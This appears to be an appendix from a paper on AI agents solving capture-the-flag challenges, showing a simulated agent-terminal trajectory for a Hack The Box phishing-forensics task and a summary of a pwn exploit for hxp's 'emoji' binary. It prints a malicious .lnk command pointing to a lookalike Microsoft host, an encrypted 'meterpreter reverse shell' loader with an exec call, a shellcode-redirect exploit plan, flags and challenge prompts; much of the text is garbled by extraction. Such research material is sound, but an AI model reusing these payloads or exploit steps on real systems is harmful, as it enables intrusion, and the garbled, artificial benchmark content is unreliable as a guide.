Player Model https://ctftime.org/writeup/40114<br>Analyzing the email contents, I notice several interesting points:<br>1. The email is from Lord Malakar's Assistant to the Royal Archives<br>2. It's marked as "Confidential Review"<br>3. There's a download link to what appears to be a PHP page<br>4. The server domain matches the one provided in the challenge<br>�→ (storage.microsoftcloudservices.com:41075)<br>5. The email uses a MIME multipart format with boundaries<br>Given that we have access to the server mentioned in the URL, and<br>�→ it's running a PHP script, I should try to connect to it and<br>�→ see what response we get. This might lead us to the CV file or<br>�→ reveal some hidden information.<br>Let me connect to the server:<br>connect_start storage.microsoftcloudservices.com 41075<br><!-- End of picture text -->


**Terminal Model https://ctftime.org/writeup/40114** Connected to storage.microsoftcloudservices.com:41075 <!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <title>Lord Malakar's Resume Portal</title> </head> <body> <h1>Welcome to Lord Malakar's Resume Portal</h1> <p>Click the button below to download the resume:</p> <form action="download.php" method="post"> <button type="submit">Download Resume</button> </form> </body> </html> (Open file: challenge.eml) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Terminal Model**

**Player Model https://ctftime.org/writeup/40114**

Interesting findings:

1. The server presents a simple HTML page with a download form

2. The form points to 'download.php' using POST method

3. There's a button to download the resume

Since the form uses POST method to download.php, I should try to _�→_ send a POST request to this endpoint. I'll create a Python _�→_ script to handle this request since we can't use interactive _�→_ commands directly. Let me create a script that will use the _�→_ requests library to make the POST request. First, I'll make sure we have the requests library installed: pip install requests

**Terminal Model https://ctftime.org/writeup/40114** Collecting requests Downloading requests-2.31.0-py3-none-any.whl (62 kB) |||||||||||||||||||||||||||||||||||||||| 62.6/62.6 kB 2.4 _�→_ MB/s eta 0:00:00 Collecting charset-normalizer<4,>=2 Downloading charset_normalizer-3.3.2-cp39-cp39-manylinux_2_17_x8 _⌋ �→_ 6_64.manylinux2014_x86_64.whl (142 _�→_ kB) ||||||||||||||||||||||||||||||||||||||| 142.3/142.3 kB 5.6 _�→_ MB/s eta 0:00:00 Collecting idna<4,>=2.5 Downloading idna-3.6-py3-none-any.whl (61 kB) |||||||||||||||||||||||||||||||||||||||| 61.6/61.6 kB 2.9 _�→_ MB/s eta 0:00:00


Collecting urllib3<3,>=1.21.1 Downloading urllib3-2.1.0-py3-none-any.whl (104 kB) ||||||||||||||||||||||||||||||||||||||| 104.6/104.6 kB 4.5 _�→_ MB/s eta 0:00:00 Collecting certifi>=2017.4.17 Downloading certifi-2023.11.17-py3-none-any.whl (162 kB) ||||||||||||||||||||||||||||||||||||||| 162.5/162.5 kB 6.3 _�→_ MB/s eta 0:00:00 Installing collected packages: urllib3, idna, charset-normalizer, _�→_ certifi, requests Successfully installed certifi-2023.11.17 charset-normalizer-3.3.2 _�→_ idna-3.6 requests-2.31.0 urllib3-2.1.0 (Open file: challenge.eml) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Player Model https://ctftime.org/writeup/40114**

Now I'll create a Python script to make the POST request to _�→_ download.php. The script will also save any response content _�→_ to a file for analysis.

create download_resume.py

**Terminal Model https://ctftime.org/writeup/40114**

[File: download_resume.py (new file)] 1:

(Open file: download_resume.py) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Player Model https://ctftime.org/writeup/40114**

I'll add the code to download_resume.py to make a POST request and _�→_ save the response. The script will include error handling and _�→_ will save both the response headers and content for analysis. edit 1:1 import requests import sys def download_resume(): url = 'http://storage.microsoftcloudservices.com:41075/downloa _⌋ �→_ d.php' try: response = requests.post(url) # Save headers for inspection with open('response_headers.txt', 'w') as f: for key, value in response.headers.items(): f.write(f'{key}: {value}\n') # Save content


```mermaid
flowchart TD
    %% Code Snippet
    Code["with open('resume_content', 'wb') as f:<br/>    f.write(response.content)<br/><br/>...<br/>if __name__ == '__main__':<br/>    download_resume()<br/>end_of_edit"]

    style Code fill:#f9f9f9,stroke:#8b0000,stroke-width:2px,text-align:left,font-family:monospace
```


<!-- Start of picture text -->
with open('resume_content', 'wb') as f:<br>f.write(response.content)<br>print(f'Status code: {response.status_code}')<br>print('Headers saved to response_headers.txt')<br>print('Content saved to resume_content')<br>except requests.exceptions.RequestException as e:<br>print(f'Error occurred: {e}')<br>sys.exit(1)<br>if __name__ == '__main__':<br>download_resume()<br>end_of_edit<br><!-- End of picture text -->


```mermaid
flowchart TD
    %% Terminal Output
    Term["<b>Terminal Model</b><br/><hr/><br/>File updated. Please review the changes...<br/>[Current content of download_resume.py (lines 1-23)]:<br/>1: import requests<br/>...<br/>bash-$"]

    style Term fill:#f9f9f9,stroke:#00008b,stroke-width:2px,text-align:left,font-family:monospace
```


<!-- Start of picture text -->
Terminal Model https://ctftime.org/writeup/40114<br>File updated. Please review the changes and make sure they are<br>�→ correct (correct indentation, no duplicate lines, etc). Edit<br>�→ the file again if necessary.<br>[Current content of download_resume.py (lines 1-23)]:<br>1: import requests<br>2: import sys<br>3:<br>4: def download_resume():<br>5: url =<br>�→ 'http://storage.microsoftcloudservices.com:41075/download.php'<br>6: try:<br>7: response = requests.post(url)<br>8:<br>9: # Save headers for inspection<br>10: with open('response_headers.txt', 'w') as f:<br>11: for key, value in response.headers.items():<br>12: f.write(f'{key}: {value}\n')<br>13:<br>14: # Save content<br>15: with open('resume_content', 'wb') as f:<br>16: f.write(response.content)<br>17:<br>18: print(f'Status code: {response.status_code}')<br>19: print('Headers saved to response_headers.txt')<br>20: print('Content saved to resume_content')<br>21:<br>22: except requests.exceptions.RequestException as e:<br>23: print(f'Error occurred: {e}')<br>24: sys.exit(1)<br>25:<br>26: if __name__ == '__main__':<br>27: download_resume()<br>(Open file: download_resume.py)<br>(Current directory: /__home__LLM_CTF_Database__A_new_Hire)<br>(Interactive session: connect<br>�→ storage.microsoftcloudservices.com:41075)<br>bash-$<br><!-- End of picture text -->


#### **Player Model**

#### **https://ctftime.org/writeup/40114**

The script looks good with proper indentation and error handling. _�→_ Now let's run the script to make the POST request and download _�→_ the resume:

python3 download_resume.py

**Terminal Model https://ctftime.org/writeup/40114** Status code: 200 Headers saved to response_headers.txt Content saved to resume_content (Open file: download_resume.py) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Terminal Model**

#### **Player Model**

**https://ctftime.org/writeup/40114**

Great! We got a successful response (status code 200). Let's first _�→_ check the response headers to see what type of file we _�→_ received:

open response_headers.txt

**Terminal Model https://ctftime.org/writeup/40114**

[File: response_headers.txt] 1: Server: nginx/1.18.0 (Ubuntu) 2: Date: Wed, 24 Jan 2024 10:01:23 GMT 3: Content-Type: application/octet-stream 4: Content-Length: 526 5: Connection: keep-alive 6: Content-Disposition: attachment; filename=resume.lnk (Open file: response_headers.txt) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$

**Player Model https://ctftime.org/writeup/40114**

Interesting findings from the headers: 1. The response is a Windows shortcut file (.lnk extension) 2. Content-Type is octet-stream 3. File size is 526 bytes This is quite suspicious - receiving a .lnk file instead of a _�→_ regular document format (like .pdf or .doc). Windows .lnk _�→_ files can contain metadata and potentially malicious commands. _�→_ Since this is a binary file, I'll use hexdump to examine its _�→_ contents:


hexdump -C resume_content

|**Terminal Model**<br>**https://**|**ctftime.**|**org/writeup/40114**|
|---|---|---|
|00000000<br>4c 00 00 00 01 14 02 00<br>00 00|L...............|_�→_|00 00 c0|00 00 00|
|00000010<br>00 00 00 46 9b 00 08 00<br>20 00|...F.... .......|_�→_|00 00 00|00 00 00|
|00000020<br>00 00 00 00 00 00 00 00<br>00 00|................|_�→_|00 00 00|00 00 00|
|00000030<br>00 00 00 00 00 00 00 00<br>01 00||_�→_|00 00 00|00 00 00|
|................<br><br>00000040<br>00 00 00 00 00 00 00 00<br>00 00||_�→_|00 00 00|00 00 00|
|................<br><br>00000050<br>00 00 00 00 00 43 00 00<br>00 00|C|_�→_|00 1c 00|00 00 00|
|...............<br><br>00000060<br>00 00 00 00 00 00 00 00<br>00 00|00 00 00|00 00 00|
||................|_�→_<br>00000070<br>00 00 00 00 00 00 00 00<br>00 00|00 00 00|00 00 00|
||................|_�→_<br>00000080<br>00 00 00 00 00 00 00 00<br>00 00||_�_|00 00 00|00 00 00|
|................<br>_→_<br>00000090<br>00 00 00 00 00 00 00 00<br>00 00||_�_|00 00 00|00 00 00|
|................<br>_→_<br>000000a0<br>00 00 00 00 00 00 00 00<br>00 00||_�_|00 00 00|00 00 00|
|................<br>_→_<br>000000b0<br>00 00 00 00 00 00 00 00<br>00 00|<|_�→_|00 00 3c|00 00 00|
|...............<br><br>000000c0<br>5b 00 53 00 79 00 73 00<br>74 00|[System|_�→_|65 00 6d|00 2e 00|
|.........<br><br>000000d0<br>44 00 69 00 61 00 67 00<br>6e 00|D.i.a.g.n.o.s.t.|_�→_|6f 00 73|00 74 00|
|000000e0<br>69 00 63 00 73 00 2e 00<br>50 00|i.c.s...P.r.o.c.|_�→_|72 00 6f|00 63 00|
|000000f0<br>65 00 73 00 73 00 5d 00<br>3a 00|ess]::St|_�→_|3a 00 53|00 74 00|
|........<br><br>00000100<br>61 00 72 00 74 00 28 00<br>27 00|t('|_�_|6d 00 73|00 65 00|
|a.r....m.s.e.<br>_→_<br>00000110<br>64 00 67 00 65 00 27 00<br>2c 00|d.g.e.'.,. .'.h.|_�→_|20 00 27|00 68 00|
|00000120<br>74 00 74 00 70 00 3a 00<br>2f 00|ttp://st|_�→_|2f 00 73|00 74 00|
|........<br><br>00000130<br>6f 00 72 00 61 00 67 00<br>65 00|rmi|_�_|2e 00 6d|00 69 00|
|o..a.g.e.....<br>_→_<br>00000140<br>63 00 72 00 6f 00 73 00<br>6f 00|c.r.o.s.o.f.t.c.|_�→_|66 00 74|00 63 00|
|00000150<br>6c 00 6f 00 75 00 64 00<br>73 00|l.o.u.d.s.e.r.v.|_�→_|65 00 72|00 76 00|
|00000160<br>69 00 63 00 65 00 73 00<br>2e 00|icescom|_�→_|63 00 6f|00 6d 00|
|.........<br><br>00000170<br>3a 00 34 00 31 00 30 00<br>37 00 <br>41075/3|35 00 2f|00 33 00|
||:........|_�→_<br>00000180<br>66 00 65 00 31 00 36 00<br>39 00|f.e.1.6.9.0.d.9.|_�→_|30 00 64|00 39 00|
|00000190<br>35 00 35 00 65 00 38 00<br>66 00|55e8fd2a|_�→_|64 00 32|00 61 00|
|........<br><br>000001a0<br>30 00 62 00 32 00 38 00<br>32 00|0.b.2.8.2.5.0.1.|_�→_|35 00 30|00 31 00|
|000001b0<br>35 00 37 00 30 00 65 00<br>31 00|5.7.0.e.1.f.4./.|_�→_|66 00 34|00 2f 00|


```mermaid
flowchart TD
    %% Terminal Output Hexdump
    Term["000001c0  72 00 65 00 ... |r.e.s.u.m.e.s.|<br/>000001d0  2f 00 72 00 ... |/.r.e.s.u.m.e._.|<br/>000001e0  6f 00 66 00 ... |o.f.f.i.c.i.a.l.|<br/>000001f0  2e 00 70 00 ... |..p.d.f.'.); .|<br/>...<br/>bash-$"]

    style Term fill:#f9f9f9,stroke:#00008b,stroke-width:2px,text-align:left,font-family:monospace
```


<!-- Start of picture text -->
000001c0 72 00 65 00 73 00 75 00 6d 00 65 00 73 00 53 00<br>�→ |r.e.s.u.m.e.s.S.|000001d0 2f 00 72 00 65 00 73 00 75 00 6d 00 65 00 5f 00<br>�→ |/.r.e.s.u.m.e._.|000001e0 6f 00 66 00 66 00 69 00 63 00 69 00 61 00 6c 00<br>�→ |o.f.f.i.c.i.a.l.|000001f0 2e 00 70 00 64 00 66 00 27 00 29 00 3b 00 20 00<br>�→ |..p.d.f.'.).; .|00000200 5c 00 5c 00 73 00 74 00 6f 00 72 00 61 00 67 00<br>�→ |\.\.s.t.o.r.a.g.|00000210 65 00 |e.|00000212<br>(Open file: response_headers.txt)<br>(Current directory: /__home__LLM_CTF_Database__A_new_Hire)<br>(Interactive session: connect<br>�→ storage.microsoftcloudservices.com:41075)<br>bash-$<br><!-- End of picture text -->

**Player Model https://ctftime.org/writeup/40114** After analyzing the hexdump, I notice something very interesting: 1. The .lnk file contains PowerShell-style code 2. It's trying to execute System.Diagnostics.Process.Start 3. It attempts to open 'msedge' (Microsoft Edge) browser 4. There's a URL in the command that points to what seems to be a _�→_ PDF file 5. The URL contains what appears to be a hash or identifier: _�→_ 3fe1690d955e8fd2a0b282501570e1f4 Let's try to access this PDF directly since the .lnk file is _�→_ trying to open it. I'll modify our Python script to get this _�→_ specific URL: edit 4:27 def download_resume(): url = 'http://storage.microsoftcloudservices.com:41075/3fe1690 _⌋ �→_ d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf' try: response = requests.get(url) # Save headers for inspection with open('response_headers.txt', 'w') as f: for key, value in response.headers.items(): f.write(f'{key}: {value}\n') # Save content with open('resume.pdf', 'wb') as f: f.write(response.content) print(f'Status code: {response.status_code}') print('Headers saved to response_headers.txt') print('Content saved to resume.pdf') except requests.exceptions.RequestException as e: print(f'Error occurred: {e}') sys.exit(1) if __name__ == '__main__': download_resume() end_of_edit


```mermaid
flowchart TD
    %% Terminal Output
    Term["<b>Terminal Model</b><br/><hr/><br/>File updated. Please review the changes...<br/>[Current content of download_resume.py (lines 1-27)]:<br/>1: import requests<br/>...<br/>5:    url = 'http://storage.microsoftcloudservices.com:41075/...'<br/>...<br/>bash-$"]

    style Term fill:#f9f9f9,stroke:#00008b,stroke-width:2px,text-align:left,font-family:monospace
```


<!-- Start of picture text -->
Terminal Model https://ctftime.org/writeup/40114<br>File updated. Please review the changes and make sure they are<br>�→ correct (correct indentation, no duplicate lines, etc). Edit<br>�→ the file again if necessary.<br>[Current content of download_resume.py (lines 1-27)]:<br>1: import requests<br>2: import sys<br>3:<br>4: def download_resume():<br>5: url = 'http://storage.microsoftcloudservices.com:41075/3fe1  ⌋<br>�→ 690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf'<br>6: try:<br>7: response = requests.get(url)<br>8:<br>9: # Save headers for inspection<br>10: with open('response_headers.txt', 'w') as f:<br>11: for key, value in response.headers.items():<br>12: f.write(f'{key}: {value}\n')<br>13:<br>14: # Save content<br>15: with open('resume.pdf', 'wb') as f:<br>16: f.write(response.content)<br>17:<br>18: print(f'Status code: {response.status_code}')<br>19: print('Headers saved to response_headers.txt')<br>20: print('Content saved to resume.pdf')<br>21:<br>22: except requests.exceptions.RequestException as e:<br>23: print(f'Error occurred: {e}')<br>24: sys.exit(1)<br>25:<br>26: if __name__ == '__main__':<br>27: download_resume()<br>(Open file: download_resume.py)<br>(Current directory: /__home__LLM_CTF_Database__A_new_Hire)<br>(Interactive session: connect<br>�→ storage.microsoftcloudservices.com:41075)<br>bash-$<br><!-- End of picture text -->

**Player Model https://ctftime.org/writeup/40114**

The script looks good with proper indentation. Now let's run the _�→_ modified script to download the PDF directly:

python3 download_resume.py

**Terminal Model https://ctftime.org/writeup/40114**

Status code: 200 Headers saved to response_headers.txt Content saved to resume.pdf (Open file: download_resume.py) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$


#### **Player Model**

**https://ctftime.org/writeup/40114**

Great! We successfully downloaded the PDF file. Let me first check _�→_ the file type to make sure we indeed received a PDF:

file resume.pdf

#### **Terminal Model**

#### **https://ctftime.org/writeup/40114**

- resume.pdf: PDF document, version 1.7 (Open file: download_resume.py)

- (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect

- _�→_ storage.microsoftcloudservices.com:41075)

- bash-$

**Player Model https://ctftime.org/writeup/40114**

- Confirmed it's a PDF document. Since the challenge description _�→_ mentions "hidden within the text are secrets", and we're _�→_ dealing with a PDF file, there are several possible ways the _�→_ data could be hidden:

1. Metadata in the PDF

2. Hidden text layers

3. Steganographic techniques

4. Comments or annotations

5. Encoded data within text

Let's first examine the PDF file with strings to look for any _�→_ obvious text patterns or hidden data:

strings resume.pdf > pdf_strings.txt && open pdf_strings.txt

**Terminal Model https://ctftime.org/writeup/40114**

[File: pdf_strings.txt] 1: %PDF-1.7 2: % 3: 1 0 obj 4: << 5: /Type /Catalog 6: /Version /1.7 7: /Pages 2 0 R 8: >> 9: endobj 10: 2 0 obj 11: << 12: /Type /Pages 13: /Kids [3 0 R] 14: /Count 1 15: >> 16: endobj 17: 3 0 obj 18: << 19: /Type /Page 20: /Parent 2 0 R 21: /Resources <<


22: /Font << 23: /F1 4 0 R 24: >> 25: >> 26: /MediaBox [0 0 612 792] 27: /Contents 6 0 R 28: >> 29: endobj 30: 4 0 obj 31: << 32: /Type /Font 33: /Subtype /Type1 34: /BaseFont /Helvetica 35: >> 36: endobj 37: 6 0 obj 38: << 39: /Length 1337 40: >> 41: stream 42: BT 43: /F1 24 Tf 44: 50 700 Td 45: (Lord Malakar) Tj 46: /F1 12 Tf 47: 0 -30 Td 48: (Noble Knight of Eldoria) Tj 49: 0 -20 Td 50: (Royal Palace, Eldoria) Tj 51: 0 -20 Td 52: (eldoria.knight@royal.realm) Tj 53: 0 -40 Td 54: /F1 16 Tf 55: (Professional Summary) Tj 56: /F1 12 Tf 57: 0 -20 Td 58: (Distinguished knight with extensive experience in realm _�→_ defense and magical artifacts.) Tj 59: 0 -20 Td 60: (Specialized in ancient runes and forbidden knowledge.) Tj 61: 0 -40 Td 62: /F1 16 Tf 63: (Experience) Tj 64: /F1 12 Tf 65: 0 -20 Td 66: (Head Knight - Royal Guard of Eldoria) Tj 67: 0 -15 Td 68: (1205 - Present) Tj 69: 0 -20 Td 70: (* Lead strategic defense operations) Tj 71: 0 -15 Td 72: (* Mastered forbidden battle techniques) Tj 73: 0 -15 Td 74: (* Conducted research on ancient artifacts) Tj 75: 0 -40 Td 76: /F1 16 Tf 77: (Education) Tj 78: /F1 12 Tf 79: 0 -20 Td 80: (Academy of Noble Knights) Tj 81: 0 -15 Td 82: (Advanced Combat and Magic Studies) Tj 83: 0 -40 Td


84: /F1 16 Tf 85: (Skills) Tj 86: /F1 12 Tf 87: 0 -20 Td 88: (* Master Swordsman) Tj 89: 0 -15 Td 90: (* Expert in Ancient Runes) Tj 91: 0 -15 Td 92: (* Dark Magic Proficiency) Tj 93: 0 -15 Td 94: (* Strategic Planning) Tj 95: 0 -40 Td 96: /F1 16 Tf 97: (Additional Note) Tj 98: /F1 12 Tf 99: 0 -20 Td

100: (For further details on achievements and forbidden knowledge _�→_ mastery, see configs/client.py) Tj (150 more lines)

(Open file: pdf_strings.txt) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect

_�→_ storage.microsoftcloudservices.com:41075) bash-$

**Player Model https://ctftime.org/writeup/40114**

Interesting findings in the PDF content:

1. It's a resume for Lord Malakar, matching the challenge _�→_ description

2. There's a very interesting line mentioning "configs/client.py"

3. The content includes references to forbidden knowledge and dark _�→_ magic

4. The dates suggest this is set in a medieval fantasy setting

Let's try to scroll down to see if there's more content in the _�→_ strings output:

scroll_down

#### **Terminal Model**

**https://ctftime.org/writeup/40114**

[File: pdf_strings.txt (continued from line 101)] 101: ET 102: endstream 103: endobj 104: xref 105: 0 7 106: 0000000000 65535 f 107: 0000000010 00000 n 108: 0000000079 00000 n 109: 0000000173 00000 n 110: 0000000301 00000 n 111: 0000000381 00000 n 112: 0000000381 00000 n 113: trailer 114: << 115: /Size 7 116: /Root 1 0 R


117: >> 118: startxref 119: 1819 120: %%EOF 121: (Open file: pdf_strings.txt) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect

_�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Player Model**

**https://ctftime.org/writeup/40114**

Looking at the complete PDF content, there's a very interesting _�→_ pointer to "configs/client.py" in the Additional Note section. _�→_ Since this is mentioned directly in the resume, and given that _�→_ Lord Malakar has fallen from grace (as mentioned in the _�→_ challenge description), this file path could be crucial.

Let's try to access this file from the same server path where we _�→_ found the PDF:

python3 -c "import requests; r =

_�→_ requests.get('http://storage.microsoftcloudservices.com:41075/ _⌋ �→_ 3fe1690d955e8fd2a0b282501570e1f4/configs/client.py'); _�→_ open('client.py', 'wb').write(r.content)"

#### **Terminal Model**

**https://ctftime.org/writeup/40114**

(Open file: pdf_strings.txt) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect

_�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Player Model**

**https://ctftime.org/writeup/40114**

You're right, I apologize. Let me modify the Python script to _�→_ access the potential client.py file:

create get_config.py

#### **Terminal Model**

**https://ctftime.org/writeup/40114**

[File: get_config.py (new file)] 1:

(Open file: get_config.py) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$


**Player Model https://ctftime.org/writeup/40114** I'll create a script to fetch the client.py file: edit 1:1 import requests import sys def get_config(): url = 'http://storage.microsoftcloudservices.com:41075/3fe1690 _⌋ �→_ d955e8fd2a0b282501570e1f4/configs/client.py' try: response = requests.get(url) print(f'Status code: {response.status_code}') if response.status_code == 200: with open('client.py', 'wb') as f: f.write(response.content) print('Content saved to client.py') else: print(f'Failed to fetch file: {response.text}') except requests.exceptions.RequestException as e: print(f'Error occurred: {e}') sys.exit(1) if __name__ == '__main__': get_config() end_of_edit **Terminal Model https://ctftime.org/writeup/40114** File updated. Please review the changes and make sure they are _�→_ correct (correct indentation, no duplicate lines, etc). Edit _�→_ the file again if necessary. [Current content of get_config.py (lines 1-21)]: 1: import requests 2: import sys 3: 4: def get_config(): 5: url = 'http://storage.microsoftcloudservices.com:41075/3fe1 _⌋ �→_ 690d955e8fd2a0b282501570e1f4/configs/client.py' 6: try: 7: response = requests.get(url) 8: 9: print(f'Status code: {response.status_code}') 10: 11: if response.status_code == 200: 12: with open('client.py', 'wb') as f: 13: f.write(response.content) 14: print('Content saved to client.py') 15: else: 16: print(f'Failed to fetch file: {response.text}') 17: 18: except requests.exceptions.RequestException as e: 19: print(f'Error occurred: {e}') 20: sys.exit(1) 21:


22: if __name__ == '__main__': 23: get_config()

(Open file: get_config.py) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Player Model**

**https://ctftime.org/writeup/40114**

The script looks good with proper indentation. Now let's run it to _�→_ try to fetch the client.py file:

python3 get_config.py

#### **Terminal Model**

**https://ctftime.org/writeup/40114**

Status code: 200

Content saved to client.py (Open file: get_config.py)

(Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect

_�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Player Model**

**https://ctftime.org/writeup/40114**

Great! We successfully downloaded the client.py file. Let's _�→_ examine its contents:

open client.py

**Terminal Model https://ctftime.org/writeup/40114**

- [File: client.py] 1: import base64 2:

- 3: key = base64.b64decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJ _⌋ �→_ jaD0xbjF0MTRsXzRjYzNzISF9Cg==")

- 4: data = base64.b64decode("c97FeXRj6jeG5P74ANItMBNYpF6Bw+dlSZ+lGt _⌋ �→_ w/dVX7H/Ef+Bq9OHOWpJqCS1J/zDdjwUpQOHOOpiLWNU0I6RiycVhXnJkW1gO4 _⌋ �→_ TGsLMRlNVhmjUtam7AsL1S0zSWGDQX8L0a+0ENt2D8cPzrb7MNlSR3jwFh3SG6 _⌋ �→_ kCAVfptAc0ixR2MoBNNFoZiOnLcM7GHBsNm/PKpY0f8wUAoOpLJmGhtADvmxIz _⌋ �→_ VQRyIHfi0h8=")

- 5:

- 6: # The data is encrypted using a secret key

- 7: # After decryption, the data will be a meterpreter reverse _�→_ shell payload

- 8: meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in _�→_ range(len(data))])

- 9: 10: # Execute the decrypted meterpreter payload 11: exec(__import__('zlib').decompress(meterpreter_data)[0]) (Open file: client.py)


(Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075) bash-$

#### **Player Model https://ctftime.org/writeup/40114**

- Very interesting findings in client.py: 1. There's a base64 encoded key 2. There's a base64 encoded data 3. The code suggests it's using XOR encryption 4. Comments indicate it's meant to execute a meterpreter reverse _�→_ shell payload

- 5. Most importantly, the base64 encoded key looks like it might be _�→_ our flag!

- Let's decode that base64 key to see if it's our flag: python3 -c "import base64; _�→_ print(base64.b64decode('SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNH _⌋ �→_ JjaD0xbjF0MTRsXzRjYzNzISF9Cg==').decode())"

- **Terminal Model https://ctftime.org/writeup/40114** HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!} (Open file: client.py) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: connect _�→_ storage.microsoftcloudservices.com:41075)

- bash-$

- **Player Model https://ctftime.org/writeup/40114** Ah, we found the flag! The decoded base64 string reveals a flag _�→_ format that matches HTB's format. Let's analyze what this flag _�→_ means:

- 1. 4PT_28 suggests APT28, a well-known threat actor group 2. m1cr0s0ft_s34rch refers to Microsoft Search 3. 1n1t14l_4cc3s suggests initial access, a common term in attack _�→_ chains

- The flag also aligns with the challenge story - Lord Malakar's _�→_ "fall from grace" was likely due to his involvement with _�→_ malicious activities, as evidenced by the meterpreter payload _�→_ in the client.py file.

- Let me submit this flag: submit 'HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}'

F.3 TRAJECTORY ANALYSIS OF EM O J I CHALLENGE

The binary exploitation (pwn) challenge emoji from hxp CTF 2020 presents a Linux x86_64 ELF binary with a menu-driven interface. The goal is to achieve shell access despite heavy restrictions on the input.


The agent successfully solves the challenge through the following steps:

1. **Initial reconnaissance:** The agent lists the challenge directory and confirms the presence of an ELF 64-bit dynamically linked executable named emoji_binary, which is not stripped. This allows direct inspection of function names during reverse engineering.

2. **Check binary protections:** Using checksec, the agent discovers that the binary has Partial RELRO, stack canary enabled, NX disabled, no PIE, and RWX segments. The lack of NX and presence of RWX memory regions hint at potential shellcode injection.

3. **Understand program flow:** Decompiling the main function reveals a menu that accepts inputs b (beer) and h (horse), corresponding to the functions aloha and drinkmybeer, respectively.

4. **Analyze memory allocation logic:** The aloha function (triggered by the beer option) seeds the PRNG, generates a random page-aligned address, and makes it RWX via mprotect. The address is stored globally and printed.

5. **Reverse engineer code execution path:** The drinkmybeer function (triggered by horse) allocates a fresh RWX memory page and reads 0x1000 bytes of input. However, it overwrites much of this region with ’A’s and fixed code copied from hardcoded locations, including two shellcode stubs placed at offsets 0x202 and 0x400. Execution begins at 0x400.

6. **Extract embedded shellcode:** The agent disassembles the embedded code at 0x400660 and 0x4006a0. The former performs syscalls (write/read), and the latter initializes registers and jumps to rax. Notably, all registers except RSP/RIP are preset to 0xDEADBEEFDEADBEEF, and the stack is filled with 0x41414141.

7. **Craft minimal jump to regain control:** Only 2 bytes of custom code are executable at offset 0x200 before overwritten regions take effect. The agent places a 2-byte relative jump instruction jmp -0x200 at offset 0x200 to redirect execution back to the beginning of the input buffer, which remains untouched.

8. **Prepare full exploit payload:** The agent places an execve("/bin/sh") shellcode at the start of the input buffer. The two-byte jump at offset 0x200 diverts execution directly to this shellcode, bypassing the overwriting logic and fixed code at 0x400.

9. **Automate exploitation:** A Python script using pwntools is developed to automate interaction with the server. It first selects beer to trigger memory mapping and receive the address, then selects horse to send the crafted payload.

10. **Get shell and retrieve flag:** Upon successful redirection to the shellcode, the agent gains interactive shell access and retrieves the contents of flag.txt, obtaining the flag:

hxp{5uch_4_ch34p_c45h_3rrr_fl4g_gr4b}

11. **Submit the flag:** The agent submits the recovered flag to successfully complete the challenge.

**CTF Challenge**

**https://ctftime.org/writeup/25465**

- We’re currently solving the following CTF challenge.The CTF challenge is a pwn problem named "emoji", worth 400 points. The description is: We're currently solving the following CTF challenge. The CTF _�→_ challenge is a pwn problem named "emoji", worth 400 points. _�→_ The description is:

- A binary presents a menu with two options: (b)eer - Generates a random address, allocates a RWX page via _�→_ mmap()

- (h)orse - Takes 0x1000 bytes of input and executes it with _�→_ restrictions:

- - Input is partially overwritten with 'A's - Only 2 bytes of custom code execution at offset 0x200 - All registers except RSP and RIP are set to 0xDEADBEEFDEADBEEF - Stack is filled with 0x41414141


|The goal is to get shell access.<br>Files included in the challenge: ['emoji_binary']|
|---|
|The challenge server is running on ```116.203.18.177``` port ```65432```<br>and you can access it from within the container environment<br>using ```connect_start 116.203.18.177 65432```<br>_�→_<br>_�→_|
|INSTRUCTIONS:|
|Now, you're going to solve this challenge on your own. Your<br>terminal session has started and you're in the challenge's<br>root directory. You can use any bash commands or the special<br>interfacetohelpyou<br>_�→_<br>_�→_<br>_�→_|
|.<br><br>Solve the challenge, executing any commands you need and writing<br>any code that may be helpful. You can also install new<br>software in the container using ```apt-get install```, or Python<br>````<br>_�→_<br>_�→_|
|packages with pip install.<br>_�→_<br>Remember, YOU CAN ONLY ENTER ONE COMMAND AT A TIME. You should<br>always wait for feedback after every command.<br>_�→_<br>When you think you have found the flag, you can submit your|
|solution by simply running the submit command.<br>_�→_|
|Note however that you cannot use any interactive session commands<br>(e.g. python, vim) in this environment, but you can write<br>scripts and run them. E.g. you can write a python script and<br>then run it with ```python <script_name>.py```.<br>_�→_<br>_�→_<br>_�→_|
|NOTE ABOUT THE EDIT COMMAND: Indentation really matters! When<br>editing a file, make sure to insert appropriate indentation<br>before each line!<br>_�→_<br>_�→_|
|IMPORTANT TIPS:|
